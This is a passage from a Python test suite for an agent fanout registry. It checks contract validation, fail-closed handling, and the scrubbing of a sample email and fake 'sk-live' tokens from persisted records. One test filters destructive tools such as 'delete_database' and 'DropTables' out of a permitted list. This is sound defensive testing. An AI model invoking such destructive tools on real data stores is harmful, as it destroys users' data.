            "record-layout separators" in error
            for error in _data_evidence_boundary_violations(laid_out)
        ), layout

    # One advisory sentence, with commas, stays valid.
    prose_finding = _minimal_data_output(
        "Most usage is free-tier, and premium adoption is growing slowly."
    )
    assert _data_evidence_boundary_violations(prose_finding) == []

    # Comma lists are legitimate query syntax.
    query_proposal = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Needs a query.",
        "confidence": "inferred",
        "evidence": [],
        "proposed_queries": [
            {
                "tool_name": "clickhouse_query",
                "request": {"operation": "read", "metric": "active_users", "aggregation": "count"},
                "expected_decision": "Which plan dominates.",
                "source_class": "external",
            }
        ],
        "requires_user_confirmation": True,
    }
    assert _data_evidence_boundary_violations(query_proposal) == []


def test_mutating_known_data_tool_hint_is_rejected_before_dispatch(monkeypatch: Any) -> None:
    """A configured mutating tool hint never reaches the child (round-10).

    The plugin bridge grants the child broad permissions and post-execution
    validation cannot undo a mutation, so ``delete_database`` must be
    filtered out of ``OUROBOROS_KNOWN_DATA_TOOLS`` before dispatch.
    """
    monkeypatch.setenv(
        "OUROBOROS_KNOWN_DATA_TOOLS",
        "clickhouse_query,delete_database,DropTables,metabase_card",
    )
    meta: dict[str, Any] = {}
    _attach_question_assist_requests(
        meta,
        session_id="sess-mutating-hint",
        question="Which plan tier do most active users hit?",
        phase="answer",
        score=None,
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        runtime_backend="codex",
    )
    lanes = {lane["lane_id"]: lane for lane in meta["question_advisory_request"]["lanes"]}
    assert lanes["data_context"]["known_data_tools"] == ["clickhouse_query", "metabase_card"]


def test_oversized_lane_contract_is_rejected_whole(tmp_path: Any) -> None:
    """A contract is enforced IFF it was deliverable untorn (round-11).

    A 25k-char contract previously rendered truncated while re-entry
    enforced the full schema — an unsatisfiable form. Oversized contracts
    are now excluded from BOTH rendering and enforcement, and the child is
    told explicitly.
    """
    from ouroboros.mcp.tools.subagent import _plugin_advisory_contract_section

    oversized_contract = {
        "contract_id": "huge_answer.v1",
        "response_model_schema": {
            "type": "object",
            "required": ["lane_id", "tail_field"],
            "properties": {
                "lane_id": {"const": "huge_lane"},
                **{f"field_{i}": {"type": "string", "description": "x" * 200} for i in range(120)},
                "tail_field": {"type": "string"},
            },
        },
    }
    lanes = [
        {
            "lane_id": "huge_lane",
            "capability": "future_capability",
            "required": True,
            "answer_contract": oversized_contract,
        },
        {
            "lane_id": "ambiguity_contrarian",
            "capability": "run_lateral_review",
            "persona": "contrarian",
            "required": True,
        },
    ]

    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-oversized", lanes=lanes
    )
    assert fanout_id is not None
    record = registry.load(fanout_id)
    assert record is not None
    # Not registered for enforcement: the child could never receive it whole.
    assert "huge_lane" not in record.synthesizer_input.get("lane_answer_contracts", {})

    # Submitting a generic-shaped output for the lane completes cleanly.
    out = submit_fanout_results(
        registry,
        session_id="sess-oversized",
        correlation_key="context.lane_id",
        results=[
            {"key": "huge_lane", "content": "generic finding"},
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert out["contract_violations"] == []

    # Generic child prompt says OMITTED explicitly and never renders a torn form.
    request = {
        "session_id": "sess-oversized",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": [lanes[0]],
    }
    payloads = build_interview_question_advisory_subagents(request)
    prompt = payloads[0].prompt
    assert "OMITTED" in prompt or "exceeds the whole-form delivery budget" in prompt
    assert "[truncated]" not in prompt

    # Plugin recipe applies the same rule.
    section = _plugin_advisory_contract_section("fanout_x", {"lanes": lanes}, "sess-oversized")
    assert "OMITTED" in section
    assert "tail_field" not in section


def test_gc_sweeps_aged_atomic_write_leftovers(tmp_path: Any) -> None:
    """Crash artifacts from atomic saves respect retention (round-11)."""
    import os as os_module
    import time

    registry = FanoutRegistry(tmp_path)
    stale_tmp = tmp_path / ".fanout_crash.json.tmp-deadbeef"
    stale_tmp.write_text('{"partial": "record"}')
    ancient = time.time() - FanoutRegistry._RECORD_RETENTION_SECONDS - 3600
    os_module.utime(stale_tmp, (ancient, ancient))
    fresh_tmp = tmp_path / ".fanout_live.json.tmp-cafebabe"
    fresh_tmp.write_text('{"partial": "record"}')

    registry._gc_stale_records()
    assert not stale_tmp.exists(), "aged atomic-write leftover is swept"
    assert fresh_tmp.exists(), "fresh temp file (possibly mid-write) survives"


def test_unenforceable_contract_shapes_are_never_advertised(tmp_path: Any) -> None:
    """A contract is enforced IFF its schema is a VALID object (round-12).

    A string schema previously bypassed re-entry validation silently, and an
    invalid JSON Schema type crashed re-entry with UnknownType. Both shapes
    are now rejected at registration; a legacy record carrying one degrades
    to unenforced instead of crashing.
    """
    string_schema_lane = {
        "lane_id": "str_lane",
        "capability": "future_capability",
        "required": True,
        "answer_contract": {
            "contract_id": "str_contract.v1",
            "response_model_schema": "just a string",
        },
    }
    invalid_type_lane = {
        "lane_id": "bad_lane",
        "capability": "future_capability",
        "required": True,
        "answer_contract": {
            "contract_id": "bad_contract.v1",
            "response_model_schema": {"type": "objectt"},
        },
    }
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-invalid-schema",
        lanes=[string_schema_lane, invalid_type_lane],
    )
    assert fanout_id is not None
    record = registry.load(fanout_id)
    assert record is not None
    assert record.synthesizer_input.get("lane_answer_contracts", {}) == {}

    # Submitting arbitrary content completes cleanly — nothing unenforceable
    # was advertised, so nothing crashes and nothing is validated against it.
    out = submit_fanout_results(
        registry,
        session_id="sess-invalid-schema",
        correlation_key="context.lane_id",
        results=[
            {"key": "str_lane", "content": "generic finding"},
            {"key": "bad_lane", "content": "generic finding"},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert out["contract_violations"] == []

    # Belt: a LEGACY record that already persisted an invalid schema must
    # degrade to unenforced at re-entry, never crash with UnknownType.
    from ouroboros.mcp.tools.subagent import _lane_answer_contract_violations

    legacy_contracts = {
        "bad_lane": {
            "contract_id": "bad_contract.v1",
            "response_model_schema": {"type": "objectt"},
        }
    }
    # Round-17: a legacy ADVERTISED contract whose validation explodes fails
    # CLOSED — the output cannot be verified, so it is a violation (never a
    # crash, never silent acceptance).
    belt = _lane_answer_contract_violations(legacy_contracts, {"bad_lane": {"x": 1}})
    assert [item["lane_id"] for item in belt] == ["bad_lane"]
    assert any("cannot be verified" in error for error in belt[0]["errors"])


def test_contract_budget_and_delivery_share_one_serialization(tmp_path: Any) -> None:
    """Budgeting and rendering measure the SAME canonical form (round-12).

    A contract that is compact-small but renders large previously passed the
    budget yet reached the child prompt truncated while re-entry enforced
    the full schema. With one canonical serialization, any contract that
    would render torn is excluded from enforcement instead.
    """
    import json as json_module

    from ouroboros.mcp.tools.subagent import (
        _INTERVIEW_ADVISORY_MAX_CONTRACT_CHARS,
        _canonical_contract_json,
        _enforceable_lane_contract,
    )

    # Grow a deeply-keyed schema until compact fits the budget but the
    # canonical (sorted+indented) rendering exceeds it — the round-12 shape.
    properties: dict[str, Any] = {}
    index = 0
    contract: dict[str, Any] = {}
    while True:
        properties[f"k{index}"] = {"type": "string"}
        index += 1
        contract = {
            "contract_id": "wide_contract.v1",
            "response_model_schema": {
                "type": "object",
                "required": ["lane_id", "tail_field"],
                "properties": {**properties, "tail_field": {"type": "string"}},
            },
        }
        compact = len(json_module.dumps(contract, ensure_ascii=False))
        rendered = len(_canonical_contract_json(contract) or "")
        if rendered > _INTERVIEW_ADVISORY_MAX_CONTRACT_CHARS:
            assert compact < _INTERVIEW_ADVISORY_MAX_CONTRACT_CHARS, (
                "probe must be compact-small but rendered-large"
            )
            break
        assert index < 2000, "failed to construct the probe shape"

    # The round-12 probe shape is now unenforceable — consistently on both
    # sides — instead of enforced-but-torn.
    assert not _enforceable_lane_contract(contract)

    lanes = [
        {
            "lane_id": "wide_lane",
            "capability": "future_capability",
            "required": True,
            "answer_contract": contract,
        }
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-wide", lanes=lanes
    )
    assert fanout_id is not None
    record = registry.load(fanout_id)
    assert record is not None
    assert "wide_lane" not in record.synthesizer_input.get("lane_answer_contracts", {})

    request = {
        "session_id": "sess-wide",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": lanes,
    }
    payloads = build_interview_question_advisory_subagents(request)
    assert "[truncated]" not in payloads[0].prompt


def test_rejected_duplicate_does_not_suppress_accumulated_result(tmp_path: Any) -> None:
    """A current-call violation must not erase earlier conforming state.

    Bot-review round-12 probe: after accumulating a valid data_context, a
    finalizing call carrying an invalid duplicate completed but omitted the
    valid persisted lane from synthesis. Exclusion now judges the value that
    is actually in the accumulated state.
    """
    registry = FanoutRegistry(tmp_path)
    request = {
        "session_id": "sess-dup",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": _interview_question_advisory_fanout_metadata()["lanes"],
    }
    payloads = build_interview_question_advisory_subagents(request)
    fanout_id = register_question_advisory_fanout(
        registry, session_id="sess-dup", payloads=payloads
    )

    valid_data = {
        "lane_id": "data_context",
        "data_needed": False,
        "finding": "No data evidence is needed for this question.",
        "confidence": "no_evidence",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": True,
    }
    first = submit_fanout_results(
        registry,
        session_id="sess-dup",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": valid_data}],
        fanout_id=fanout_id,
        finalize=False,
    )
    assert first["status"] == "accumulated"

    invalid_duplicate = {**valid_data, "requires_user_confirmation": False}
    closing = submit_fanout_results(
        registry,
        session_id="sess-dup",
        correlation_key="context.lane_id",
        results=[
            {"key": "data_context", "content": invalid_duplicate},
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
        ],
        fanout_id=fanout_id,
    )
    assert closing["status"] == "complete"
    # The rejected duplicate is reported…
    assert [item["lane_id"] for item in closing["contract_violations"]] == ["data_context"]
    # …but the earlier CONFORMING value still reaches synthesis.
    aggregated = {
        item["lane_id"]: item["output"] for item in closing["result"]["aggregated_outputs"]
    }
    # Round-56: a lane whose content was not retained is not a received lane,
    # so it is reported missing instead of completing around a summary.
    assert "data_context" not in aggregated
    assert "data_context" in closing["missing_optional_keys"]


def test_finalize_accumulation_is_advisory_only(tmp_path: Any) -> None:
    """finalize=false must not persist synthesis-validated kinds (round-13).

    A wrong-session code_facts result previously accumulated as
    ``accumulation_persisted=true`` before its kind-specific validation ever
    ran. Non-advisory kinds now reject non-finalizing accumulation before
    any durable write.
    """
    registry = FanoutRegistry(tmp_path)
    question = "Which manifest declares the package?"
    session_id = "sess-code-finalize"
    meta: dict[str, Any] = {}
    _attach_question_assist_requests(
        meta,
        session_id=session_id,
        question=question,
        phase="answer",
        score=None,
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        runtime_backend="codex",
    )
    fanout_id = register_code_investigation_fanout(
        registry,
        session_id=session_id,
        request=meta["code_investigation_request"],
    )
    out = submit_fanout_results(
        registry,
        session_id=session_id,
        correlation_key="code_facts",
        results=[
            {"key": "code_facts", "content": _code_fact_output("some-other-session", question)}
        ],
        fanout_id=fanout_id,
        finalize=False,
    )
    assert out["status"] == "finalize_unsupported"
    record = registry.load(fanout_id)
    assert record is not None
    assert record.received_results == {}


def test_unenforceable_data_contract_fails_closed(tmp_path: Any) -> None:
    """The data lane keeps its boundary scan when its contract is dropped.

    Bot-review round-13 probe: an oversized data contract was skipped at
    registration, after which email/token content completed with no
    violations and persisted. The lane now registers a minimal object
    contract so the contract-id-keyed policy scan stays active.
    """
    oversized_schema: dict[str, Any] = {
        "type": "object",
        "properties": {
            f"field_{i}": {"type": "string", "description": "x" * 200} for i in range(120)
        },
    }
    lanes = [
        {
            "lane_id": "data_context",
            "capability": "call_mcp",
            "required": False,
            "data_policy": {"read_only": True, "aggregate_only": True},
            "answer_contract": {
                "contract_id": "data_evidence_answer.v1",
                "response_model_schema": oversized_schema,
            },
        },
        {
            "lane_id": "ambiguity_contrarian",
            "capability": "run_lateral_review",
            "persona": "contrarian",
            "required": True,
        },
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-data-closed", lanes=lanes
    )
    assert fanout_id is not None
    record = registry.load(fanout_id)
    assert record is not None
    fallback = record.synthesizer_input["lane_answer_contracts"]["data_context"]
    assert fallback["contract_id"] == "data_evidence_answer.v1"
    # The fallback keeps the invariants that DEFINE the lane (round-43): a
    # degraded contract must not become a weaker contract.
    fallback_schema = fallback["response_model_schema"]
    assert fallback_schema["properties"]["requires_user_confirmation"] == {"const": True}
    assert "requires_user_confirmation" in fallback_schema["required"]

    pii_output = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Contact alice@example.com with token=sk-live-321.",
        "confidence": "reported_by_tool",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": True,
    }
    out = submit_fanout_results(
        registry,
        session_id="sess-data-closed",
        correlation_key="context.lane_id",
        results=[
            {"key": "data_context", "content": pii_output},
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert [item["lane_id"] for item in out["contract_violations"]] == ["data_context"]
    persisted = (tmp_path / f"{fanout_id}.json").read_text()
    assert "alice@example.com" not in persisted
    assert "sk-live-321" not in persisted

    # The host-driven renderer uses the same enforceability decision: no
    # truncated form claiming to supersede the generic shape.
    request = {
        "session_id": "sess-data-closed",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": [lanes[0]],
    }
    payloads = build_interview_question_advisory_subagents(request)
    prompt = payloads[0].prompt
    assert "[truncated]" not in prompt
    # Round-57: the enforced form is DELIVERED, not paraphrased — a prose
    # summary of a schema drifts from the schema.
    assert "is what re-entry enforces in its place" in prompt
    assert '"contract_id": "data_evidence_answer.v1"' in prompt
    assert "binds and is enforced" in prompt


def test_scalar_contract_is_not_advertised(tmp_path: Any) -> None:
    """A valid-but-scalar schema is unsatisfiable, so it is never advertised.

    Bot-review round-13 probe: re-entry rejects non-object outputs before
    schema validation, so a required lane following its advertised
    {"type": "string"} contract stayed permanently partial.
    """
    lanes = [
        {
            "lane_id": "scalar_lane",
            "capability": "future_capability",
            "required": True,
            "answer_contract": {
                "contract_id": "scalar_contract.v1",
                "response_model_schema": {"type": "string"},
            },
        },
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-scalar", lanes=lanes
    )
    assert fanout_id is not None
    record = registry.load(fanout_id)
    assert record is not None
    assert record.synthesizer_input.get("lane_answer_contracts", {}) == {}

    # Following the generic shape (a plain string finding) completes — the
    # lane is not trapped behind an unsatisfiable advertised contract.
    out = submit_fanout_results(
        registry,
        session_id="sess-scalar",
        correlation_key="context.lane_id",
        results=[{"key": "scalar_lane", "content": "a plain string finding"}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert out["contract_violations"] == []


def test_null_content_does_not_count_toward_completion(tmp_path: Any) -> None:
    """Key presence alone is not a submission (bot-review round-14 probe).

    Two required lanes submitted without usable content previously returned
    ``complete`` and durably synthesized two ``None`` outputs.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-null-content",
        payloads=_mixed_advisory_payloads(),
    )
    out = submit_fanout_results(
        registry,
        session_id="sess-null-content",
        correlation_key="context.lane_id",
        results=[
            {"key": "ambiguity_contrarian"},
            {"key": "answer_simplifier", "content": None},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert out["missing_required_keys"] == ["ambiguity_contrarian", "answer_simplifier"]
    assert out["malformed_keys"] == ["ambiguity_contrarian", "answer_simplifier"]
    record = registry.load(fanout_id)
    assert record is not None
    assert record.received_results == {}


def test_legacy_violating_required_value_reopens_and_scrubs(tmp_path: Any) -> None:
    """Accumulated violations fail closed (bot-review round-14 probe).

    A required legacy data value carrying an email/token and
    ``requires_user_confirmation=false`` previously terminalized as
    ``complete`` with an empty aggregation while staying durable. The value
    is now scrubbed and the required lane reopens.
    """
    import json as json_module

    from ouroboros.mcp.tools.subagent import FANOUT_KIND_QUESTION_ADVISORY, FanoutRecord

    registry = FanoutRegistry(tmp_path)
    metadata_lanes = _interview_question_advisory_fanout_metadata()["lanes"]
    data_contract = next(
        lane["answer_contract"] for lane in metadata_lanes if lane["lane_id"] == "data_context"
    )
    violating_legacy_value = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Contact alice@example.com token=sk-live-999",
        "confidence": "reported_by_tool",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": False,
    }
    # Simulate a legacy record persisted BEFORE door validation existed,
    # with data_context REQUIRED and already occupied by a violating value.
    record = FanoutRecord(
        fanout_id="fanout_legacy_violating",
        kind=FANOUT_KIND_QUESTION_ADVISORY,
        session_id="sess-legacy-scrub",
        correlation_key="context.lane_id",
        expected_keys=("data_context", "ambiguity_contrarian"),
        synthesizer_input={
            "lane_ids": ["data_context", "ambiguity_contrarian"],
            "lane_answer_contracts": {"data_context": dict(data_contract)},
        },
        required_keys=("data_context", "ambiguity_contrarian"),
        received_results={"data_context": violating_legacy_value},
    )
    assert registry.save(record)

    out = submit_fanout_results(
        registry,
        session_id="sess-legacy-scrub",
        correlation_key="context.lane_id",
        results=[{"key": "ambiguity_contrarian", "content": "contrarian-advice"}],
        fanout_id="fanout_legacy_violating",
    )
    # The violating required lane REOPENS instead of terminalizing empty —
    # since round-15 the scrub happens BEFORE the first durable write, so the
    # early partial branch already reports it as missing + violating.
    assert out["status"] == "partial"
    assert "data_context" in out["missing_required_keys"]
    assert [item["lane_id"] for item in out["contract_violations"]] == ["data_context"]
    # …and the violating value is scrubbed from durable state.
    persisted = (tmp_path / "fanout_legacy_violating.json").read_text()
    assert "alice@example.com" not in persisted
    assert "sk-live-999" not in persisted
    reloaded = registry.load("fanout_legacy_violating")
    assert reloaded is not None
    assert reloaded.completed is False
    assert "data_context" not in reloaded.received_results

    # A conforming resubmission then completes with the good value.
    conforming = {
        "lane_id": "data_context",
        "data_needed": False,
        "finding": "No data evidence is needed for this question.",
        "confidence": "no_evidence",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": True,
    }
    retry = submit_fanout_results(
        registry,
        session_id="sess-legacy-scrub",
        correlation_key="context.lane_id",
        results=[
            {"key": "data_context", "content": conforming},
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
        ],
        fanout_id="fanout_legacy_violating",
    )
    assert retry["status"] == "complete"
    aggregated = {item["lane_id"]: item["output"] for item in retry["result"]["aggregated_outputs"]}
    assert aggregated["data_context"] == conforming
    assert json_module.loads((tmp_path / "fanout_legacy_violating.json").read_text())["completed"]


def test_invalid_legacy_schema_keeps_data_boundary_scan() -> None:
    """Schema unenforceability never disables the policy scan (round-14).

    A legacy data contract with an unknown schema type previously skipped
    the boundary scan entirely, accepting email/token content.
    """
    from ouroboros.mcp.tools.subagent import _lane_answer_contract_violations

    legacy_contracts = {
        "data_context": {
            "contract_id": "data_evidence_answer.v1",
            "response_model_schema": {"type": "objectt"},
        }
    }
    pii_output = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Contact alice@example.com token=sk-live-777",
        "confidence": "reported_by_tool",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": True,
    }
    violations = _lane_answer_contract_violations(legacy_contracts, {"data_context": pii_output})
    assert [item["lane_id"] for item in violations] == ["data_context"]
    joined = " ".join(violations[0]["errors"])
    assert "not admissible" in joined
    assert "alice@example.com" not in joined


def test_lock_inode_verification_detects_replaced_path(tmp_path: Any) -> None:
    """A lock on a dead inode excludes nobody (bot-review round-14).

    Both GC helpers verify inode identity after flock; this pins the
    detection primitive: once the path is unlinked and recreated, the old fd
    no longer matches and the holder must not act.
    """
    import os as os_module

    lock_path = tmp_path / ".fanout_race.lock"
    lock_path.write_text("")
    fd = os_module.open(lock_path, os_module.O_RDWR)
    try:
        assert FanoutRegistry._lock_inode_matches(fd, lock_path)
        os_module.unlink(lock_path)
        assert not FanoutRegistry._lock_inode_matches(fd, lock_path)
        lock_path.write_text("")
        assert not FanoutRegistry._lock_inode_matches(fd, lock_path)
    finally:
        os_module.close(fd)


def test_accumulated_violations_are_scrubbed_before_partial_persistence(
    tmp_path: Any,
) -> None:
    """Every durable write validates accumulated state (round-15 probe).

    A legacy violating data value previously rode the early missing-required
    partial branch back into the record unvalidated. It is now scrubbed and
    reported before that first re-save.
    """
    from ouroboros.mcp.tools.subagent import FANOUT_KIND_QUESTION_ADVISORY, FanoutRecord

    registry = FanoutRegistry(tmp_path)
    metadata_lanes = _interview_question_advisory_fanout_metadata()["lanes"]
    data_contract = next(
        lane["answer_contract"] for lane in metadata_lanes if lane["lane_id"] == "data_context"
    )
    violating_legacy_value = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Contact alice@example.com token=sk-live-555",
        "confidence": "reported_by_tool",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": False,
    }
    record = FanoutRecord(
        fanout_id="fanout_legacy_partial",
        kind=FANOUT_KIND_QUESTION_ADVISORY,
        session_id="sess-legacy-partial",
        correlation_key="context.lane_id",
        expected_keys=("data_context", "ambiguity_contrarian", "answer_simplifier"),
        synthesizer_input={
            "lane_ids": ["data_context", "ambiguity_contrarian", "answer_simplifier"],
            "lane_answer_contracts": {"data_context": dict(data_contract)},
        },
        required_keys=("ambiguity_contrarian", "answer_simplifier"),
        received_results={"data_context": violating_legacy_value},
    )
    assert registry.save(record)

    # Submit only ONE required lane: the other stays missing, so this call
    # exits through the EARLY partial branch — which must already have
    # validated and scrubbed the accumulated state.
    out = submit_fanout_results(
        registry,
        session_id="sess-legacy-partial",
        correlation_key="context.lane_id",
        results=[{"key": "ambiguity_contrarian", "content": "contrarian-advice"}],
        fanout_id="fanout_legacy_partial",
    )
    assert out["status"] == "partial"
    assert [item["lane_id"] for item in out["contract_violations"]] == ["data_context"]
    persisted = (tmp_path / "fanout_legacy_partial.json").read_text()
    assert "alice@example.com" not in persisted
    assert "sk-live-555" not in persisted


def test_non_mapping_legacy_schema_keeps_data_boundary_scan() -> None:
    """The data policy scan is keyed on contract identity, not schema shape.

    Bot-review round-16 probe: response_model_schema="invalid" skipped the
    boundary scan entirely, accepting email/token content.
    """
    from ouroboros.mcp.tools.subagent import _lane_answer_contract_violations

    legacy_contracts = {
        "data_context": {
            "contract_id": "data_evidence_answer.v1",
            "response_model_schema": "invalid",
        }
    }
    pii_output = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Contact alice@example.com token=sk-live-777",
        "confidence": "reported_by_tool",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": True,
    }
    violations = _lane_answer_contract_violations(legacy_contracts, {"data_context": pii_output})
    assert [item["lane_id"] for item in violations] == ["data_context"]
    assert any("not admissible" in error for error in violations[0]["errors"])


@pytest.mark.asyncio
async def test_plugin_lateral_envelope_carries_reentry_identity(tmp_path: Any) -> None:
    """The plugin lateral transport gets the same durable re-entry contract.

    Bot-review round-16 probe: the plugin envelope returned neither
    fanout_id nor correlation key and created no record, making re-entry
    unavailable on that transport.
    """
    registry = FanoutRegistry(tmp_path)
    handler = LateralThinkHandler(
        agent_runtime_backend="opencode",
        opencode_mode="plugin",
        fanout_registry=registry,
    )
    result = await handler.handle(
        {
            "problem_context": "stuck on a milestone question",
            "current_approach": "keep asking the same thing",
            "personas": ["researcher", "contrarian"],
        }
    )
    assert result.is_ok, result
    meta = result.unwrap().meta
    assert meta["dispatch_mode"] == "plugin"
    fanout_id = meta["fanout_id"]
    assert meta["result_correlation_key"] == "context.persona"
    owner_session = meta["session_id"]
    assert owner_session.startswith("lateral-")

    record = registry.load(fanout_id)
    assert record is not None
    assert record.session_id == owner_session

    out = submit_fanout_results(
        registry,
        session_id=owner_session,
        correlation_key="context.persona",
        results=[
            {"key": "researcher", "content": "researcher-out"},
            {"key": "contrarian", "content": "contrarian-out"},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"


def test_unresolvable_ref_contract_is_not_advertised(tmp_path: Any) -> None:
    """Contract validation never fails open on unresolved $refs (round-17).

    A meta-schema-valid contract referencing missing #/$defs previously
    registered, then validation exceptions became errors=[] — completing
    with arbitrary content on an advertised required contract.
    """
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    unresolvable_contract = {
        "contract_id": "future_ref.v1",
        "response_model_schema": {
            "type": "object",
            "required": ["lane_id", "payload"],
            "properties": {
                "lane_id": {"const": "ref_lane"},
                "payload": {"$ref": "#/$defs/missing_definition"},
            },
        },
    }
    assert not _enforceable_lane_contract(unresolvable_contract)

    # A RESOLVABLE local ref stays enforceable — no false positive.
    resolvable_contract = {
        "contract_id": "future_ref_ok.v1",
        "response_model_schema": {
            "type": "object",
            "required": ["lane_id", "payload"],
            "properties": {
                "lane_id": {"const": "ref_lane"},
                "payload": {"$ref": "#/$defs/payload_shape"},
            },
            "$defs": {"payload_shape": {"type": "string"}},
        },
    }
    assert _enforceable_lane_contract(resolvable_contract)

    # End-to-end: the unresolvable contract is never advertised, so the lane
    # completes on the generic shape with no silent-unenforced window.
    lanes = [
        {
            "lane_id": "ref_lane",
            "capability": "future_capability",
            "required": True,
            "answer_contract": unresolvable_contract,
        },
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-ref", lanes=lanes
    )
    assert fanout_id is not None
    record = registry.load(fanout_id)
    assert record is not None
    assert record.synthesizer_input.get("lane_answer_contracts", {}) == {}

    out = submit_fanout_results(
        registry,
        session_id="sess-ref",
        correlation_key="context.lane_id",
        results=[{"key": "ref_lane", "content": "generic finding"}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert out["contract_violations"] == []


def test_legacy_unresolvable_ref_record_fails_closed(tmp_path: Any) -> None:
    """A legacy ADVERTISED-but-broken contract keeps its lane incomplete.

    Bot-review round-17: content that cannot be verified is not accepted —
    the violation is reported and the required lane stays missing instead of
    completing unvalidated.
    """
    from ouroboros.mcp.tools.subagent import FANOUT_KIND_QUESTION_ADVISORY, FanoutRecord

    registry = FanoutRegistry(tmp_path)
    record = FanoutRecord(
        fanout_id="fanout_legacy_ref",
        kind=FANOUT_KIND_QUESTION_ADVISORY,
        session_id="sess-legacy-ref",
        correlation_key="context.lane_id",
        expected_keys=("ref_lane",),
        synthesizer_input={
            "lane_ids": ["ref_lane"],
            "lane_answer_contracts": {
                "ref_lane": {
                    "contract_id": "future_ref.v1",
                    "response_model_schema": {
                        "type": "object",
                        "properties": {"payload": {"$ref": "#/$defs/missing_definition"}},
                    },
                }
            },
        },
        required_keys=("ref_lane",),
    )
    assert registry.save(record)

    out = submit_fanout_results(
        registry,
        session_id="sess-legacy-ref",
        correlation_key="context.lane_id",
        results=[{"key": "ref_lane", "content": {"payload": "anything"}}],
        fanout_id="fanout_legacy_ref",
    )
    assert out["status"] == "partial"
    assert "ref_lane" in out["missing_required_keys"]
    violations = out["contract_violations"]
    assert [item["lane_id"] for item in violations] == ["ref_lane"]
    assert any("cannot be verified" in error for error in violations[0]["errors"])
    reloaded = registry.load("fanout_legacy_ref")
    assert reloaded is not None
    assert reloaded.completed is False
    assert reloaded.received_results == {}


def test_dynamic_ref_contract_is_not_advertised() -> None:
    """Every Draft 2020-12 reference form is preflighted (round-18 probe)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    dynamic_ref_contract = {
        "contract_id": "future_dynamic.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {"payload": {"$dynamicRef": "#missing"}},
        },
    }
    assert not _enforceable_lane_contract(dynamic_ref_contract)

    recursive_ref_contract = {
        "contract_id": "future_recursive.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {"payload": {"$recursiveRef": "#/definitions/missing"}},
        },
    }
    assert not _enforceable_lane_contract(recursive_ref_contract)


def test_root_ref_object_contract_is_enforceable(tmp_path: Any) -> None:
    """A valid object contract expressed through a root $ref is advertised.

    Bot-review round-20 probe: requiring a literal root type silently
    dropped valid local-root-ref contracts, after which {"ok": false}
    completed with no violation.
    """
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    root_ref_contract = {
        "contract_id": "root_ref.v1",
        "response_model_schema": {
            "$ref": "#/$defs/root",
            "$defs": {
                "root": {
                    "type": "object",
                    "required": ["lane_id", "verdict"],
                    "properties": {
                        "lane_id": {"const": "ref_root_lane"},
                        "verdict": {"type": "string"},
                    },
                }
            },
        },
    }
    assert _enforceable_lane_contract(root_ref_contract)

    # A root ref resolving to a NON-object stays unenforceable.
    scalar_root_ref = {
        "contract_id": "root_ref_scalar.v1",
        "response_model_schema": {
            "$ref": "#/$defs/root",
            "$defs": {"root": {"type": "string"}},
        },
    }
    assert not _enforceable_lane_contract(scalar_root_ref)

    # End-to-end: the advertised root-ref contract IS enforced at re-entry.
    lanes = [
        {
            "lane_id": "ref_root_lane",
            "capability": "future_capability",
            "required": True,
            "answer_contract": root_ref_contract,
        },
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-root-ref", lanes=lanes
    )
    assert fanout_id is not None
    out = submit_fanout_results(
        registry,
        session_id="sess-root-ref",
